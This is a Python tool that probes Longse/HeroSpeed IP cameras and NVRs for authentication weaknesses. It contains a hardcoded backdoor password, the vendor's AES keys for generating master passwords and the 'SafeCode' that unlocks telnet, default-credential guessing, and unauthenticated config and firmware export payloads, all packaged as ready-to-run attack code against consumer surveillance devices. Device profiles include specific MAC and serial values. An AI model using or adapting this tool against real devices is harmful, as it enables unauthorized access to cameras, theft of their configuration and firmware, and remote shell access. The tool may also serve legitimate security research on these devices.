#!/usr/bin/env python3
"""
Unified auth / backdoor probe for Longse / HeroSpeed style devices.

What it checks:
- API session login-capabilities availability
- Multiple hashed login variants against /api/session/login
- Common/default credentials
- Generated master-password candidates
- /api/system/import-export no-auth leak
- /api/system/paramconfig payload probes
- Legacy /paramconfig and /cmdlist.htm with hardcoded bypass
- /vb.htm legacy Basic-auth probe
- /open_telnet Basic-auth probe with generated SafeCode

The script is intentionally probe-oriented: it records what worked,
what failed, and what was unavailable on a given build/device.
"""

from __future__ import annotations

import argparse
import base64
import datetime as dt
import hashlib
import json
import re
import sys
from dataclasses import asdict, dataclass, field
from typing import Any

import requests

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except Exception:  # pragma: no cover - optional runtime dependency
    AES = None
    pad = None


HARD_BYPASS = "MI1YSANORQ4NAELR"
SAFE_KEY = b"+2G-WQVK00hCt7Yb(*__*)+_%^LONGSE"
SAFE_IV = b"(*__*)+_%^LONGSE"
MASTER_KEY = b"+2G-WQVK00hCt7Yb(*__*)+_%^LONGSE"
DEFAULT_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    )
}


@dataclass
class Result:
    name: str
    category: str
    ok: bool
    detail: str
    status: int | None = None
    evidence: dict[str, Any] = field(default_factory=dict)


PROFILES: dict[str, dict[str, Any]] = {
    "nvr31": {
        "username": "admin",
        "passwords": ["12345", "12345678", "12345678E"],
        "mac": "2C6F512D50DD",
        "sn": "8701131866080",
        "check_open_telnet": True,
        "check_import_export": True,
        "check_vb": True,
    },
    "force28": {
        "username": "admin",
        "passwords": ["admin", "12345", "123456", "12345678", "12345678E"],
        "mac": None,
        "sn": "8801406967929",
        "check_open_telnet": False,
        "check_import_export": False,
        "check_vb": False,
    },
}


PARAMCONFIG_PAYLOADS = [
    {"action": "get", "data": {"name": "firmware"}},
    {"action": "get", "data": {"name": "export_firmware"}},
    {"action": "get", "data": {"name": "all_config"}},
    {"action": "get", "data": {"name": "system_backup"}},
    {"action": "set", "data": {"name": "export", "path": "/tmp/www/flash.bin"}},
]


def now_pair() -> tuple[str, str]:
    now = dt.datetime.now()
    raw = now.strftime("%Y-%m-%dT%H:%M:%S")
    b64 = base64.b64encode(raw.encode("ascii")).decode("ascii")
    return b64, raw


def sha256_hex(data: str) -> str:
    return hashlib.sha256(data.encode("latin1")).hexdigest()


def hex_to_str(hex_text: str) -> str:
    hex_text = hex_text.strip().lower()
    if hex_text.startswith("0x"):
        hex_text = hex_text[2:]
    return bytes.fromhex(hex_text).decode("latin1")


def normalize_mac(mac: str | None) -> str | None:
    if not mac:
        return None
    cleaned = re.sub(r"[^0-9A-Fa-f]", "", mac).upper()
    return cleaned or None


def generate_master_password(mac: str, sn: str) -> str:
    plain = f"{mac}#{sn}".encode("utf-8")
    pad_len = 16 - (len(plain) % 16)
    plain += bytes([pad_len]) * pad_len
    if AES is None:
        raise RuntimeError("PyCryptodome unavailable; cannot generate master password")
    cipher = AES.new(MASTER_KEY, AES.MODE_CBC, b"\x00" * 16)
    enc = cipher.encrypt(plain)
    return hashlib.md5(enc).hexdigest()[:16]


def generate_safe_code(base_id: str) -> str:
    if AES is None or pad is None:
        raise RuntimeError("PyCryptodome unavailable; cannot generate SafeCode")
    padded_id = base_id.ljust(16, "0")
    plaintext = f"{padded_id}#Guangzhou Longse 2019.".encode("utf-8")
    cipher = AES.new(SAFE_KEY, AES.MODE_CBC, SAFE_IV)
    encrypted = cipher.encrypt(pad(plaintext, 16))
    return base64.b64encode(encrypted).decode("ascii")


def login_hash_standard(
    username: str, password: str, salt: str, challenge: str, iterations: int
) -> tuple[str, str]:
    b64_datetime, raw_datetime = now_pair()
    step1 = sha256_hex(username + salt + b64_datetime + password)
    step2 = sha256_hex(hex_to_str(step1) + challenge)
    out = step2
    for _ in range(int(iterations)):
        out = sha256_hex(hex_to_str(out))
    return out, raw_datetime


def login_hash_shifted(
    username: str, password: str, salt: str, challenge: str, iterations: int
) -> tuple[str, str]:
    b64_datetime, raw_datetime = now_pair()
    step1 = sha256_hex(username + salt + b64_datetime + password)
    shifted = step1[22:38]
    out = sha256_hex(shifted + challenge)
    for _ in range(int(iterations)):
        out = sha256_hex(out)
    return out, raw_datetime


class ProbeClient:
    def __init__(self, host: str, timeout: int = 6, https: bool = False) -> None:
        self.host = host
        self.timeout = timeout
        self.scheme = "https" if https else "http"
        self.base = f"{self.scheme}://{self.host}"
        self.s = requests.Session()
        self.s.headers.update(DEFAULT_HEADERS)
        self.s.verify = False
        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]

    def request(
        self,
        method: str,
        path: str,
        *,
        json_payload: Any | None = None,
        auth: tuple[str, str] | None = None,
        extra_headers: dict[str, str] | None = None,
    ) -> requests.Response:
        headers = dict(DEFAULT_HEADERS)
        if json_payload is not None:
            headers["Content-Type"] = "application/json"
        if extra_headers:
            headers.update(extra_headers)
        return self.s.request(
            method=method,
            url=self.base + path,
            json=json_payload,
            auth=auth,
            timeout=self.timeout,
            allow_redirects=False,
            headers=headers,
        )

    def try_json(
        self, method: str, path: str, **kwargs: Any
    ) -> tuple[requests.Response | None, dict[str, Any] | None, str | None]:
        try:
            r = self.request(method, path, **kwargs)
        except Exception as exc:
            return None, None, str(exc)
        try:
            return r, r.json(), None
        except Exception:
            return r, None, None


def mk_result(
    results: list[Result],
    *,
    name: str,
    category: str,
    ok: bool,
    detail: str,
    status: int | None = None,
    **evidence: Any,
) -> None:
    results.append(
        Result(
            name=name,
            category=category,
            ok=ok,
            detail=detail,
            status=status,
            evidence=evidence,
        )
    )


def probe_login_capabilities(results: list[Result], c: ProbeClient, username: str) -> dict[str, Any] | None:
    r, data, err = c.try_json(
        "POST",
        "/api/session/login-capabilities",
        json_payload={"action": "get", "data": {"username": username}},
    )
    if err:
        mk_result(
            results,
            name="api.login_capabilities",
            category="api",
            ok=False,
            detail=err,
        )
        return None
    code = None if data is None else data.get("code")
    ok = r is not None and r.status_code == 200 and code == 0
    mk_result(
        results,
        name="api.login_capabilities",
        category="api",
        ok=ok,
        detail=f"http={r.status_code} code={code}" if r else "no response",
        status=None if r is None else r.status_code,
        response=data if data is not None else (r.text[:200] if r else ""),
    )
    return data if ok else None


def try_login_variant(
    results: list[Result],
    c: ProbeClient,
    username: str,
    password: str,
    variant: str,
) -> None:
    caps = probe_login_capabilities([], c, username)
    if not caps:
        mk_result(
            results,
            name=f"login.{variant}.{username}:{password}",
            category="login",
            ok=False,
            detail="login-capabilities unavailable",
        )
        return

    data = caps.get("data", {}) or {}
    param = data.get("param", {}) or {}
    session_id = data.get("sessionID")
    if not session_id:
        mk_result(
            results,
            name=f"login.{variant}.{username}:{password}",
            category="login",
            ok=False,
            detail="no sessionID",
        )
        return

    salt = str(param.get("salt", ""))
    challenge = str(param.get("challenge", ""))
    iterations = int(param.get("iterations", 0) or 0)

    if variant == "standard":
        final_pwd, raw_datetime = login_hash_standard(
            username, password, salt, challenge, iterations
        )
    elif variant == "shifted":
        final_pwd, raw_datetime = login_hash_shifted(
            username, password, salt, challenge, iterations
        )
    else:
        raise ValueError(f"Unknown variant {variant}")

    payload = {
        "action": "set",
        "data": {
            "username": username,
            "loginEncryptionType": (data.get("encryptionType") or ["sha256-1"])[0],
            "password": final_pwd,
            "sessionID": session_id,
            "datetime": raw_datetime,
        },
    }
    r, out, err = c.try_json("POST", "/api/session/login", json_payload=payload)
    if err:
        mk_result(
            results,
            name=f"login.{variant}.{username}:{password}",
            category="login",
            ok=False,
            detail=err,
        )
        return
    code = None if out is None else out.get("code")
    ok = r is not None and r.status_code == 200 and code == 0
    mk_result(
        results,
        name=f"login.{variant}.{username}:{password}",
        category="login",
        ok=ok,
        detail=f"http={r.status_code} code={code}" if r else "no response",
        status=None if r is None else r.status_code,
        response=out if out is not None else (r.text[:200] if r else ""),
    )


def probe_import_export(results: list[Result], c: ProbeClient) -> None:
    r, out, err = c.try_json(
        "POST", "/api/system/import-export", json_payload={"action": "get"}
    )
    if err:
        mk_result(results, name="api.import_export", category="api", ok=False, detail=err)
        return
    code = None if out is None else out.get("code")
    ok = r is not None and r.status_code == 200 and code == 0
    detail = f"http={r.status_code} code={code}" if r else "no response"
    if ok and out and isinstance(out.get("data"), dict):
        has_blob = "configureFile" in out["data"]
        detail += f" configureFile={has_blob}"
    mk_result(
        results,
        name="api.import_export",
        category="api",
        ok=ok,
        detail=detail,
        status=None if r is None else r.status_code,
        response=out if out is not None else (r.text[:200] if r else ""),
    )


def probe_json_endpoint(
    results: list[Result],
    c: ProbeClient,
    name: str,
    path: str,
    payload: dict[str, Any],
    *,
    auth: tuple[str, str] | None = None,
) -> None:
    r, out, err = c.try_json("POST", path, json_payload=payload, auth=auth)
    display_auth = "none" if auth is None else f"{auth[0]}:{auth[1]}"
    if err:
        mk_result(
            results,
            name=f"{name}[{display_auth}]",
            category="api",
            ok=False,
            detail=err,
        )
        return
    code = None if out is None else out.get("code")
    body = out if out is not None else (r.text[:200] if r else "")
    body_text = json.dumps(body, ensure_ascii=False) if isinstance(body, dict) else str(body)
    ok = r is not None and (
        (r.status_code == 200 and code == 0)
        or any(tok in body_text.lower() for tok in ("/tmp/", ".bin", "flash.bin", "configurefile"))
    )
    mk_result(
        results,
        name=f"{name}[{display_auth}]",
        category="api",
        ok=ok,
        detail=f"http={r.status_code} code={code}" if r else "no response",
        status=None if r is None else r.status_code,
        response=body,
    )


def probe_paramconfig(results: list[Result], c: ProbeClient) -> None:
    auths = [None, ("admin", HARD_BYPASS)]
    for payload in PARAMCONFIG_PAYLOADS:
        label = f"api.paramconfig.{payload['action']}.{payload['data'].get('name', 'na')}"
        for auth in auths:
            probe_json_endpoint(
                results, c, label, "/api/system/paramconfig", payload, auth=auth
            )

    for path in ("/paramconfig", "/cmdlist.htm"):
        for auth in (None, ("admin", HARD_BYPASS)):
            display_auth = "none" if auth is None else f"{auth[0]}:{auth[1]}"
            try:
                r = c.request("GET", path, auth=auth)
                ok = r.status_code == 200
                mk_result(
                    results,
                    name=f"legacy{path}[{display_auth}]",
                    category="legacy",
                    ok=ok,
                    detail=f"http={r.status_code}",
                    status=r.status_code,
                    response=r.text[:200],
                )
            except Exception as exc:
                mk_result(
                    results,
                    name=f"legacy{path}[{display_auth}]",
                    category="legacy",
                    ok=False,
                    detail=str(exc),
                )


def probe_vb(results: list[Result], c: ProbeClient, username: str, passwords: list[str]) -> None:
    for password in passwords:
        try:
            r = c.request(
                "GET",
                "/vb.htm?selectalluserlist",
                auth=(username, password),
            )
            ok = r.status_code == 200 and "401" not in r.text[:200]
            mk_result(
                results,
                name=f"legacy.vb.{username}:{password}",
                category="legacy",
                ok=ok,
                detail=f"http={r.status_code}",
                status=r.status_code,
                response=r.text[:200],
            )
        except Exception as exc:
            mk_result(
                results,
                name=f"legacy.vb.{username}:{password}",
                category="legacy",
                ok=False,
                detail=str(exc),
            )


def probe_open_telnet(
    results: list[Result],
    c: ProbeClient,
    *,
    base_ids: list[tuple[str, str]],
    usernames: list[str],
) -> None:
    if not base_ids:
        mk_result(
            results,
            name="open_telnet",
            category="backdoor",
            ok=False,
            detail="skipped: no MAC/SN provided",
        )
        return

    if AES is None or pad is None:
        mk_result(
            results,
            name="open_telnet",
            category="backdoor",
            ok=False,
            detail="skipped: PyCryptodome unavailable",
        )
        return

    for src_name, base_id in base_ids:
        code = generate_safe_code(base_id)
        for username in usernames:
            for method in ("GET", "POST"):
                try:
                    r = c.request(method, "/open_telnet", auth=(username, code))
                    ok = r.status_code in (200, 204)
                    detail = f"http={r.status_code}"
                    if r.status_code == 401:
                        detail += " unauthorized"
                    mk_result(
                        results,
                        name=f"open_telnet.{method}.{username}.{src_name}",
                        category="backdoor",
                        ok=ok,
                        detail=detail,
                        status=r.status_code,
                        response=r.text[:200],
                        safe_code=code,
                    )
                except Exception as exc:
                    mk_result(
                        results,
                        name=f"open_telnet.{method}.{username}.{src_name}",
                        category="backdoor",
                        ok=False,
                        detail=str(exc),
                        safe_code=code,
                    )


def probe_basic_api(results: list[Result], c: ProbeClient) -> None:
    basics = [
        ("api.platform_capabilities", "/api/system/platform-capabilities"),
        ("api.device_info", "/api/system/device-info"),
    ]
    for name, path in basics:
        r, out, err = c.try_json("POST", path, json_payload={"action": "get", "data": {}})
        if err:
            mk_result(results, name=name, category="api", ok=False, detail=err)
            continue
        code = None if out is None else out.get("code")
        ok = r is not None and r.status_code == 200 and code == 0
        mk_result(
            results,
            name=name,
            category="api",
            ok=ok,
            detail=f"http={r.status_code} code={code}" if r else "no response",
            status=None if r is None else r.status_code,
            response=out if out is not None else (r.text[:200] if r else ""),
        )

    for path in ("/", "/live.html", "/frame.html"):
        try:
            r = c.request("GET", path)
            ok = r.status_code == 200
            mk_result(
                results,
                name=f"http.get.{path}",
                category="http",
                ok=ok,
                detail=f"http={r.status_code}",
                status=r.status_code,
                response=r.text[:200],
            )
        except Exception as exc:
            mk_result(
                results,
                name=f"http.get.{path}",
                category="http",
                ok=False,
                detail=str(exc),
            )


def print_summary(results: list[Result], *, json_mode: bool = False) -> None:
    if json_mode:
        print(json.dumps([asdict(r) for r in results], indent=2, ensure_ascii=False))
        return

    successes = [r for r in results if r.ok]
    failures = [r for r in results if not r.ok]

    print("== SUCCESS ==")
    if successes:
        for r in successes:
            print(f"[+] {r.name}: {r.detail}")
    else:
        print("[-] no confirmed successes")

    print("\n== FAIL / UNAVAILABLE ==")
    for r in failures:
        print(f"[-] {r.name}: {r.detail}")


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Longse/HeroSpeed auth matrix probe")
    p.add_argument("--host", required=True, help="Target host/IP")
    p.add_argument(
        "--profile",
        default="auto",
        choices=["auto", "nvr31", "force28"],
        help="Preset for candidate creds and tests",
    )
    p.add_argument("--username", default=None, help="Username to test (default from profile)")
    p.add_argument(
        "--password",
        dest="passwords",
        action="append",
        default=[],
        help="Additional password candidate; may be passed multiple times",
    )
    p.add_argument("--mac", default=None, help="MAC for generated candidates / SafeCode")
    p.add_argument("--sn", default=None, help="Serial/P2P for generated candidates / SafeCode")
    p.add_argument("--https", action="store_true", help="Use HTTPS instead of HTTP")
    p.add_argument("--timeout", type=int, default=6, help="HTTP timeout in seconds")
    p.add_argument("--json", action="store_true", help="Emit JSON instead of text summary")
    return p


def choose_profile(profile: str, host: str) -> str:
    if profile != "auto":
        return profile
    if host.endswith(".31"):
        return "nvr31"
    if host.endswith(".28"):
        return "force28"
    return "nvr31"


def main() -> int:
    args = build_parser().parse_args()
    profile_name = choose_profile(args.profile, args.host)
    prof = PROFILES[profile_name]
    username = args.username or prof["username"]
    passwords = list(dict.fromkeys(prof["passwords"] + args.passwords))
    mac = normalize_mac(args.mac or prof.get("mac"))
    sn = args.sn or prof.get("sn")

    results: list[Result] = []
    c = ProbeClient(args.host, timeout=args.timeout, https=args.https)

    probe_basic_api(results, c)
    probe_login_capabilities(results, c, username)

    for password in passwords:
        for variant in ("standard", "shifted"):
            try_login_variant(results, c, username, password, variant)

    if mac and sn:
        try:
            generated = generate_master_password(mac, sn)
            for variant in ("standard", "shifted"):
                try_login_variant(results, c, username, generated, variant)
        except Exception as exc:
            mk_result(
                results,
                name="generated_master",
                category="login",
                ok=False,
                detail=str(exc),
                mac=mac,
                sn=sn,
            )

    if prof.get("check_import_export", False):
        probe_import_export(results, c)

    probe_paramconfig(results, c)

    if prof.get("check_vb", False):
        probe_vb(results, c, username, passwords)

    if prof.get("check_open_telnet", False):
        base_ids: list[tuple[str, str]] = []
        if mac:
            base_ids.append(("mac", mac))
        if sn:
            base_ids.append(("sn", sn))
        probe_open_telnet(results, c, base_ids=base_ids, usernames=["admin", "root"])

    print_summary(results, json_mode=args.json)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
